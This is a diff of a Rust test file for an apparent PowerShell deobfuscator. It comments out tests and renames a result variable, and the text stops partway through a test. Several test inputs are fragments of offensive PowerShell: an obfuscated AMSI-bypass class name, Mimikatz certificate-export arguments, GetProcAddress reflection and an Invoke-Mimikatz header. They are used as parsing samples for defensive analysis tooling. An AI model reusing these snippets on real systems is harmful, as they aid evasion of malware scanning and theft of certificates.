-        let input = r#" ("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ems'+'iUt'),'ls',('S'+'ystem.'+'Danage'+'men'+'t'),'i')"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::String("System.Danagement.Automation.EmsiUtils".into())
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![r#""System.Danagement.Automation.EmsiUtils""#].join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 0);
-    }
+//     #[test]
+//     fn encod_command() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" ("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ems'+'iUt'),'ls',('S'+'ystem.'+'Danage'+'men'+'t'),'i')"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::String("System.Danagement.Automation.EmsiUtils".into())
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![r#""System.Danagement.Automation.EmsiUtils""#].join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 0);
+//     }
 
-    #[test]
-    fn array_literals() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn array_literals() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        //integers
-        let input = r#" $a = 1,2,3;$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3)])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @(1,2,3)", "@(1,2,3)"].join(NEWLINE)
-        );
+//         //integers
+//         let input = r#" $a = 1,2,3;$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3)])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @(1,2,3)", "@(1,2,3)"].join(NEWLINE)
+//         );
 
-        // strings
-        let input = r#" $a = "x", 'yyy', "z";$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::String("x".into()),
-                PsValue::String("yyy".into()),
-                PsValue::String("z".into())
-            ])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![r#"$a = @("x","yyy","z")"#, r#"@("x","yyy","z")"#].join(NEWLINE)
-        );
+//         // strings
+//         let input = r#" $a = "x", 'yyy', "z";$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::String("x".into()),
+//                 PsValue::String("yyy".into()),
+//                 PsValue::String("z".into())
+//             ])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![r#"$a = @("x","yyy","z")"#, r#"@("x","yyy","z")"#].join(NEWLINE)
+//         );
 
-        // expresssions
-        let input = r#" $a = 1,2+ 3,[long]4;$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Int(1),
-                PsValue::Int(2),
-                PsValue::Int(3),
-                PsValue::Int(4),
-            ])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @(1,2,3,4)", "@(1,2,3,4)"].join(NEWLINE)
-        );
+//         // expresssions
+//         let input = r#" $a = 1,2+ 3,[long]4;$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Int(1),
+//                 PsValue::Int(2),
+//                 PsValue::Int(3),
+//                 PsValue::Int(4),
+//             ])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @(1,2,3,4)", "@(1,2,3,4)"].join(NEWLINE)
+//         );
 
-        // variables
-        let input = r#" $x = 3; $a = $x, $x+1, "count=$x";$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Int(3),
-                PsValue::Int(3),
-                PsValue::Int(1),
-                PsValue::String("count=3".into()),
-            ])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![
-                "$x = 3",
-                "$a = @(3,3,1,\"count=3\")",
-                "@(3,3,1,\"count=3\")"
-            ]
-            .join(NEWLINE)
-        );
+//         // variables
+//         let input = r#" $x = 3; $a = $x, $x+1, "count=$x";$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Int(3),
+//                 PsValue::Int(3),
+//                 PsValue::Int(1),
+//                 PsValue::String("count=3".into()),
+//             ])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![
+//                 "$x = 3",
+//                 "$a = @(3,3,1,\"count=3\")",
+//                 "@(3,3,1,\"count=3\")"
+//             ]
+//             .join(NEWLINE)
+//         );
 
-        // nested arrays
-        let input = r#" $a = (1, 2), (3, 4);$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2)]),
-                PsValue::Array(vec![PsValue::Int(3), PsValue::Int(4)]),
-            ])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @(@(1,2),@(3,4))", "@(@(1,2),@(3,4))"].join(NEWLINE)
-        );
+//         // nested arrays
+//         let input = r#" $a = (1, 2), (3, 4);$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2)]),
+//                 PsValue::Array(vec![PsValue::Int(3), PsValue::Int(4)]),
+//             ])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @(@(1,2),@(3,4))", "@(@(1,2),@(3,4))"].join(NEWLINE)
+//         );
 
-        // nested arrays
-        let input = r#" $a = 1, "two", 3.0, $false, (Get-Date);$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Int(1),
-                PsValue::String("two".into()),
-                PsValue::Float(3.0),
-                PsValue::Bool(false),
-                PsValue::String("Get-Date".into()),
-            ])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![
-                "$a = @(1,\"two\",3,$false,Get-Date)",
-                "@(1,\"two\",3,$false,Get-Date)"
-            ]
-            .join(NEWLINE)
-        );
+//         // nested arrays
+//         let input = r#" $a = 1, "two", 3.0, $false, (Get-Date);$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Int(1),
+//                 PsValue::String("two".into()),
+//                 PsValue::Float(3.0),
+//                 PsValue::Bool(false),
+//                 PsValue::String("Get-Date".into()),
+//             ])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![
+//                 "$a = @(1,\"two\",3,$false,Get-Date)",
+//                 "@(1,\"two\",3,$false,Get-Date)"
+//             ]
+//             .join(NEWLINE)
+//         );
 
-        // array assign to another array
-        let input = r#" $a = 1, 2,3;$b = $a,4,5;$b"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3)]),
-                PsValue::Int(4),
-                PsValue::Int(5),
-            ])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @(1,2,3)", "$b = @(@(1,2,3),4,5)", "@(@(1,2,3),4,5)"].join(NEWLINE)
-        );
+//         // array assign to another array
+//         let input = r#" $a = 1, 2,3;$b = $a,4,5;$b"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3)]),
+//                 PsValue::Int(4),
+//                 PsValue::Int(5),
+//             ])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @(1,2,3)", "$b = @(@(1,2,3),4,5)", "@(@(1,2,3),4,5)"].join(NEWLINE)
+//         );
 
-        // forEach-Object
-        let input = r#"  $a = 1,-2,(-3) | ForEach-Object { $_ * 2 };$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(2), PsValue::Int(-4), PsValue::Int(-6),])
-        );
+//         // forEach-Object
+//         let input = r#"  $a = 1,-2,(-3) | ForEach-Object { $_ * 2 };$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(2), PsValue::Int(-4), PsValue::Int(-6),])
+//         );
 
-        // forEach-Object - parentheses
-        let input = r#"  $a = (1,2,3) | ForEach-Object { $_ };$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3),])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @(1,2,3)", "@(1,2,3)"].join(NEWLINE)
-        );
+//         // forEach-Object - parentheses
+//         let input = r#"  $a = (1,2,3) | ForEach-Object { $_ };$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3),])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @(1,2,3)", "@(1,2,3)"].join(NEWLINE)
+//         );
 
-        // array assign to another array
-        let input = r#" $a = @{
-    A = 1,2,3
-    B = (4,5),6
-}
-$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::HashTable(HashMap::from([
-                (
-                    "a".into(),
-                    PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3),])
-                ),
-                (
-                    "b".into(),
-                    PsValue::Array(vec![
-                        PsValue::Array(vec![PsValue::Int(4), PsValue::Int(5)]),
-                        PsValue::Int(6),
-                    ])
-                ),
-            ]))
-        );
+//         // array assign to another array
+//         let input = r#" $a = @{
+//     A = 1,2,3
+//     B = (4,5),6
+// }
+// $a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::HashTable(HashMap::from([
+//                 (
+//                     "a".into(),
+//                     PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3),])
+//                 ),
+//                 (
+//                     "b".into(),
+//                     PsValue::Array(vec![
+//                         PsValue::Array(vec![PsValue::Int(4), PsValue::Int(5)]),
+//                         PsValue::Int(6),
+//                     ])
+//                 ),
+//             ]))
+//         );
 
-        // function argument as array
-        let input = r#" function Foo($x) { $x.GetType().name + $x[2]};Foo(1,2,3)"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::String("Object[]3".into()));
+//         // function argument as array
+//         let input = r#" function Foo($x) { $x.GetType().name + $x[2]};Foo(1,2,3)"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::String("Object[]3".into()));
 
-        // function argument as array
-        let input = r#" [object[]](1,2,3)"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3)])
-        );
+//         // function argument as array
+//         let input = r#" [object[]](1,2,3)"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2), PsValue::Int(3)])
+//         );
 
-        // function argument as array
-        let input = r#" $a = ,(42,2);$a"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Array(vec![
-                PsValue::Int(42),
-                PsValue::Int(2)
-            ])])
-        );
+//         // function argument as array
+//         let input = r#" $a = ,(42,2);$a"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Array(vec![
+//                 PsValue::Int(42),
+//                 PsValue::Int(2)
+//             ])])
+//         );
 
-        // function argument as array
-        let input = r#" function Foo($x) { $x.GetType().name + $x[2]};Foo(1,2,3)"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::String("Object[]3".into()));
+//         // function argument as array
+//         let input = r#" function Foo($x) { $x.GetType().name + $x[2]};Foo(1,2,3)"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::String("Object[]3".into()));
 
-        // function argument as array
-        let input = r#" function b($x) {$x};b(1,2+3,4)"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Int(1),
-                PsValue::Int(2),
-                PsValue::Int(3),
-                PsValue::Int(4),
-            ])
-        );
+//         // function argument as array
+//         let input = r#" function b($x) {$x};b(1,2+3,4)"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Int(1),
+//                 PsValue::Int(2),
+//                 PsValue::Int(3),
+//                 PsValue::Int(4),
+//             ])
+//         );
 
-        // function argument as array
-        let input =
-            r#" $a=@{val = 4};function b($x) {$x};b(1, [long]($a | Where-Object val -eq 4).val)"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(1), PsValue::Int(4)])
-        );
-    }
+//         // function argument as array
+//         let input =
+//             r#" $a=@{val = 4};function b($x) {$x};b(1, [long]($a | Where-Object val -eq 4).val)"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(1), PsValue::Int(4)])
+//         );
+//     }
 
-    #[test]
-    fn cast_expression() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn cast_expression() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        //simple
-        let input = r#" $a=@{val = 4};[long]($a).val"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(4));
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @{", "\tval = 4", "}", "4"].join(NEWLINE)
-        );
+//         //simple
+//         let input = r#" $a=@{val = 4};[long]($a).val"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(4));
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @{", "\tval = 4", "}", "4"].join(NEWLINE)
+//         );
 
-        let input = r#" $a=@{val = 4};[long]($a | Where-Object Val -eq 4).val"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(4));
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @{", "\tval = 4", "}", "4"].join(NEWLINE)
-        );
-    }
+//         let input = r#" $a=@{val = 4};[long]($a | Where-Object Val -eq 4).val"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(4));
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @{", "\tval = 4", "}", "4"].join(NEWLINE)
+//         );
+//     }
 
-    #[test]
-    fn as_expression() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn as_expression() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        //simple
-        let input = r#" '1a1' -replace 'a' -as [int] "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(11));
+//         //simple
+//         let input = r#" '1a1' -replace 'a' -as [int] "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(11));
 
-        let input = r#" '1a1' -replace ('a' -as [int])"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::String("1a1".into()));
+//         let input = r#" '1a1' -replace ('a' -as [int])"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::String("1a1".into()));
 
-        let input = r#" '2' -as [int] -shl 1"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(4));
+//         let input = r#" '2' -as [int] -shl 1"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(4));
 
-        let input = r#" [system.text.encoding]::unicode -shl 1 "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Null);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            String::from("BitwiseError: -shl not defined for UnicodeEncoding")
-        );
+//         let input = r#" [system.text.encoding]::unicode -shl 1 "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Null);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             String::from("BitwiseError: -shl not defined for UnicodeEncoding")
+//         );
 
-        let input = r#" [int] -shl 1 "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Null);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            String::from("BitwiseError: -shl not defined for Int32")
-        );
+//         let input = r#" [int] -shl 1 "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Null);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             String::from("BitwiseError: -shl not defined for Int32")
+//         );
 
-        let input = r#" '2' -as ([string] -shl 1) "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Null);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            String::from("BitwiseError: -shl not defined for String")
-        );
+//         let input = r#" '2' -as ([string] -shl 1) "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Null);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             String::from("BitwiseError: -shl not defined for String")
+//         );
 
-        let input = r#" '2' -as ([int]) "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(2));
+//         let input = r#" '2' -as ([int]) "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(2));
 
-        let input = r#" '2' -As ([int]) "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(2));
-    }
+//         let input = r#" '2' -As ([int]) "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(2));
+//     }
 
-    #[test]
-    fn cast_assignment() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn cast_assignment() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#" [int] $elo = "1"; $elo "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(1));
+//         let input = r#" [int] $elo = "1"; $elo "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(1));
 
-        let input = r#" [int] $elo = "1a": $elo"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Null);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            String::from("ValError: Failed to convert value \"1a\" to type Int")
-        );
+//         let input = r#" [int] $elo = "1a": $elo"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Null);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             String::from("ValError: Failed to convert value \"1a\" to type Int")
+//         );
 
-        let input = r#" [double] $elo = "1a": $elo"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Null);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            String::from("ValError: Failed to convert value \"1a\" to type Float")
-        );
+//         let input = r#" [double] $elo = "1a": $elo"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Null);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             String::from("ValError: Failed to convert value \"1a\" to type Float")
+//         );
 
-        let input = r#" [int[]] $elo = "1", "2"; $elo"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2)])
-        );
+//         let input = r#" [int[]] $elo = "1", "2"; $elo"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(1), PsValue::Int(2)])
+//         );
 
-        let input = r#" [byte[]] $elo = "1", "2"; $elo"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Char(49), PsValue::Char(50)])
-        );
-    }
+//         let input = r#" [byte[]] $elo = "1", "2"; $elo"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Char(49), PsValue::Char(50)])
+//         );
+//     }
 
-    #[test]
-    fn splatten_arg() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn splatten_arg() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#" $a = @{ elo= 2; name= "radek"}; write-output @a "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert!(script_res.output().contains("-elo 2"));
-        assert!(script_res.output().contains("-name radek"));
-    }
+//         let input = r#" $a = @{ elo= 2; name= "radek"}; write-output @a "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert!(program_res.output().contains("-elo 2"));
+//         assert!(program_res.output().contains("-name radek"));
+//     }
 
-    #[test]
-    fn strange_assignment() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn strange_assignment() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#" @(1,2)[0] = 1 "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.errors()[0].to_string(), "Skip".to_string());
+//         let input = r#" @(1,2)[0] = 1 "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.errors()[0].to_string(), "Skip".to_string());
 
-        let input = r#" "elo"[0] = 1 "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.errors()[0].to_string(), "Skip".to_string());
+//         let input = r#" "elo"[0] = 1 "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.errors()[0].to_string(), "Skip".to_string());
 
-        let input = r#" $a = @(1,2); $a[1] = 5; $a "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(1), PsValue::Int(5)])
-        );
+//         let input = r#" $a = @(1,2); $a[1] = 5; $a "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(1), PsValue::Int(5)])
+//         );
 
-        let input = r#" $a = @(1,@(2,3));$a[1] = 6;$a "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![PsValue::Int(1), PsValue::Int(6)])
-        );
+//         let input = r#" $a = @(1,@(2,3));$a[1] = 6;$a "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![PsValue::Int(1), PsValue::Int(6)])
+//         );
 
-        let input = r#" $a = @(1,@(2,3));$a[1][1] = 6;$a "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Int(1),
-                PsValue::Array(vec![PsValue::Int(2), PsValue::Int(6)])
-            ])
-        );
-    }
+//         let input = r#" $a = @(1,@(2,3));$a[1][1] = 6;$a "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Int(1),
+//                 PsValue::Array(vec![PsValue::Int(2), PsValue::Int(6)])
+//             ])
+//         );
+//     }
 
-    #[test]
-    fn script_param_block() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn script_param_block() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#" 
-[CmdletBinding(DefaultParameterSetName = "Path", HelpURI = "https://go.microsoft.com/fwlink/?LinkId=517145")]
-param(
-	[Parameter(ParameterSetName="Path", Position = 0)]
-	[System.String[]]
-	$Path = [IntPtr]::Zero
+//         let input = r#" 
+// [CmdletBinding(DefaultParameterSetName = "Path", HelpURI = "https://go.microsoft.com/fwlink/?LinkId=517145")]
+// param(
+// 	[Parameter(ParameterSetName="Path", Position = 0)]
+// 	[System.String[]]
+// 	$Path = [IntPtr]::Zero
 
-)
+// )
 
-begin
-{
-	# Construct the strongly-typed crypto object
-}
+// begin
+// {
+// 	# Construct the strongly-typed crypto object
+// }
 
-process
-{
-	Write-output elo
-}
-"#;
-        let _script_res = p.parse_input(input).unwrap();
-    }
+// process
+// {
+// 	Write-output elo
+// }
+// "#;
+//         let _program_res = p.parse_input(input).unwrap();
+//     }
 
-    #[test]
-    fn line_escape() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn line_escape() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#" 
-if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
-				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
-		{
-			return
-		}
-"#;
-        let _script_res = p.parse_input(input).unwrap();
-    }
+//         let input = r#" 
+// if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
+// 				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
+// 		{
+// 			return
+// 		}
+// "#;
+//         let _program_res = p.parse_input(input).unwrap();
+//     }
 
-    #[test]
-    fn str_escape() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn str_escape() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#" 
-$ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
-"#;
-        let result = r#"$exeargs = "crypto::cng crypto::capi "crypto::certificates /export" "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" exit""#;
-        let script_res = p.parse_input(input).unwrap();
-        println!("{}", script_res.deobfuscated());
-        assert_eq!(script_res.deobfuscated(), result);
-    }
+//         let input = r#" 
+// $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
+// "#;
+//         let result = r#"$exeargs = "crypto::cng crypto::capi "crypto::certificates /export" "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" exit""#;
+//         let program_res = p.parse_input(input).unwrap();
+//         println!("{}", program_res.deobfuscated());
+//         assert_eq!(program_res.deobfuscated(), result);
+//     }
 
-    #[test]
-    fn unknown_method_arg() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn unknown_method_arg() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#" $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null); "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert!(script_res.tokens().string_set().contains("GetProcAddress"));
-    }
+//         let input = r#" $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null); "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert!(program_res.tokens().string_set().contains("GetProcAddress"));
+//     }
 
-    #[test]
-    fn int32_type() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+//     #[test]
+//     fn int32_type() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
 
-        let input = r#"
-function Invoke-Mimikatz
-{
-    [CmdletBinding(DefaultParameterSetName="DumpCreds")]
-    Param(
-        [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
-        [String]
-        $Command
-    )
+//         let input = r#"
+// function Invoke-Mimikatz
+// {
+//     [CmdletBinding(DefaultParameterSetName="DumpCreds")]
+//     Param(
+//         [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
+//         [String]
+//         $Command
+//     )
 
